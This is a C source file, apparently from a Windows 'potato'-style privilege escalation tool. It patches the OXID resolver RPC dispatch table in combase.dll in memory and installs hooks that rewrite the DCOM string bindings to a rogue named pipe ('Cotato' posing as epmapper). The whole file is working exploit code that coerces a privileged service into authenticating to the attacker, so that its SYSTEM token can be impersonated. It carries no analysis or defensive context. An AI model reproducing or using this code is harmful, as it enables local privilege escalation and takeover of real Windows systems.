#include "../includes/hook.h"
#include "../includes/utils.h"

HOOK_CTX g_HookCtx;

static int __stdcall HookCore(void **ppDsaNewBindings, void *ppDsaNewSecurity) {
    (void)ppDsaNewSecurity;

    static const char tcpEp[] = "ncacn_ip_tcp:safe !";

    char pipeAnsi[256] = {0};
    WideCharToMultiByte(CP_ACP, 0, g_HookCtx.ClientPipeW, -1,
                        pipeAnsi, sizeof(pipeAnsi), NULL, NULL);

    SIZE_T ep0Len = strlen(pipeAnsi);
    SIZE_T ep1Len = strlen(tcpEp);

    SIZE_T entrieSize = 3 + ep0Len + 1 + ep1Len + 1;
    SIZE_T memSize    = entrieSize * 2 + 10;

    BYTE *buf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, memSize);
    if (!buf) return -1;

    *(INT16*)(buf + 0) = (INT16)entrieSize;
    *(INT16*)(buf + 2) = (INT16)(entrieSize - 2);

    SIZE_T off = 4;
    for (SIZE_T i = 0; i < ep0Len; i++) {
        *(UINT16*)(buf + off) = (UINT16)(unsigned char)pipeAnsi[i];
        off += 2;
    }
    off += 2;
    for (SIZE_T i = 0; i < ep1Len; i++) {
        *(UINT16*)(buf + off) = (UINT16)(unsigned char)tcpEp[i];
        off += 2;
    }
    off += 2;

    *ppDsaNewBindings = buf;
    return 0;
}

static int __stdcall Hook4 (void*a,void*b,void*c,void*d)                                                               { (void)a;(void)b;                                                                            return HookCore((void**)c,d);   }
static int __stdcall Hook5 (void*a,void*b,void*c,void*d,void*e)                                                        { (void)a;(void)b;(void)c;                                                                    return HookCore((void**)d,e);   }
static int __stdcall Hook6 (void*a,void*b,void*c,void*d,void*e,void*f)                                                 { (void)a;(void)b;(void)c;(void)d;                                                            return HookCore((void**)e,f);   }
static int __stdcall Hook7 (void*a,void*b,void*c,void*d,void*e,void*f,void*g)                                          { (void)a;(void)b;(void)c;(void)d;(void)e;                                                    return HookCore((void**)f,g);   }
static int __stdcall Hook8 (void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h)                                   { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;                                           return HookCore((void**)g,h);   }
static int __stdcall Hook9 (void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h,void*i)                            { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;                                   return HookCore((void**)h,i);   }
static int __stdcall Hook10(void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h,void*i,void*j)                     { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;                          return HookCore((void**)i,j);   }
static int __stdcall Hook11(void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h,void*i,void*j,void*k)              { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i;                  return HookCore((void**)j,k);   }
static int __stdcall Hook12(void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h,void*i,void*j,void*k,void*l)       { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i;(void)j;         return HookCore((void**)k,l);   }
static int __stdcall Hook13(void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h,void*i,void*j,void*k,void*l,void*m){ (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i;(void)j;(void)k; return HookCore((void**)l,m);  }
static int __stdcall Hook14(void*a,void*b,void*c,void*d,void*e,void*f,void*g,void*h,void*i,void*j,void*k,void*l,void*m,void*n) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i;(void)j;(void)k;(void)l; return HookCore((void**)m,n); }

static PVOID SelectHookFn(UINT paramCount) {
    switch (paramCount) {
        case  4: return Hook4;
        case  5: return Hook5;
        case  6: return Hook6;
        case  7: return Hook7;
        case  8: return Hook8;
        case  9: return Hook9;
        case 10: return Hook10;
        case 11: return Hook11;
        case 12: return Hook12;
        case 13: return Hook13;
        case 14: return Hook14;
        default: return NULL;
    }
}

BOOL InitContext(void) {
    SIZE_T modSize = 0;
    BYTE *modBase  = (BYTE*)GetModuleBaseAndSize("combase.dll", &modSize);
    if (!modBase || modSize == 0) {
        fprintf(stderr, "[-] Could not locate combase.dll\n");
        return FALSE;
    }
    printf("[+] combase.dll: 0x%p  size: %zu\n", modBase, modSize);

    BYTE pattern[4 + 16];
    UINT rsiSize = (UINT)sizeof(RPC_SERVER_INTERFACE);
    memcpy(pattern, &rsiSize, 4);

    DWORD d1 = ORCB_GUID.Data1;
    WORD  d2 = ORCB_GUID.Data2;
    WORD  d3 = ORCB_GUID.Data3;
    memcpy(pattern + 4,  &d1, 4);
    memcpy(pattern + 8,  &d2, 2);
    memcpy(pattern + 10, &d3, 2);
    memcpy(pattern + 12, ORCB_GUID.Data4, 8);

    SIZE_T matchCount = 0;
    SIZE_T *matches   = SundaySearch(modBase, modSize, pattern, sizeof(pattern), &matchCount);
    if (!matches || matchCount == 0) {
        fprintf(stderr, "[-] RPC_SERVER_INTERFACE not found in combase.dll\n");
        free(matches);
        return FALSE;
    }
    printf("[+] RPC_SERVER_INTERFACE at offset 0x%zx\n", matches[0]);

    RPC_SERVER_INTERFACE *rsi = (RPC_SERVER_INTERFACE*)(modBase + matches[0]);
    free(matches);

    RPC_DISPATCH_TABLE *rdt = rsi->DispatchTable;
    MIDL_SERVER_INFO   *msi = (MIDL_SERVER_INFO*)rsi->InterpreterInfo;

    printf("[+] DispatchTable:   0x%p\n", (void*)rdt);
    printf("[+] InterpreterInfo: 0x%p\n", (void*)msi);

    g_HookCtx.DispatchTablePtr = (PVOID*)msi->DispatchTable;
    g_HookCtx.OriginalFn       = g_HookCtx.DispatchTablePtr[0];

    PUCHAR procStr = msi->ProcString;
    USHORT offset0 = msi->FmtStringOffset[0];
    g_HookCtx.ParamCount = *(UCHAR*)(procStr + offset0 + 19);

    printf("[+] UseProtseq param count: %u\n", g_HookCtx.ParamCount);

    lstrcpyW(g_HookCtx.ClientPipeW,
             L"ncacn_np:localhost/pipe/Cotato[\\pipe\\epmapper]");

    return TRUE;
}

BOOL HookRpc(void) {
    PVOID hookFn = SelectHookFn(g_HookCtx.ParamCount);
    if (!hookFn) {
        fprintf(stderr, "[-] Unsupported param count %u\n", g_HookCtx.ParamCount);
        return FALSE;
    }

    HANDLE hProc   = (HANDLE)(LONG_PTR)-1;
    PVOID  addr    = g_HookCtx.DispatchTablePtr;
    SIZE_T sz      = sizeof(PVOID);
    ULONG  oldProt = 0;

    NTSTATUS st = _NtProtectVirtualMemory(hProc, &addr, &sz,
                                          PAGE_EXECUTE_READWRITE, &oldProt);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtProtectVirtualMemory failed: 0x%08X\n", st);
        return FALSE;
    }

    g_HookCtx.DispatchTablePtr[0] = hookFn;
    g_HookCtx.Hooked = TRUE;
    printf("[+] RPC hook installed\n");
    return TRUE;
}

void RestoreRpc(void) {
    if (g_HookCtx.Hooked) {
        g_HookCtx.DispatchTablePtr[0] = g_HookCtx.OriginalFn;
        g_HookCtx.Hooked = FALSE;
        printf("[+] RPC hook restored\n");
    }
}
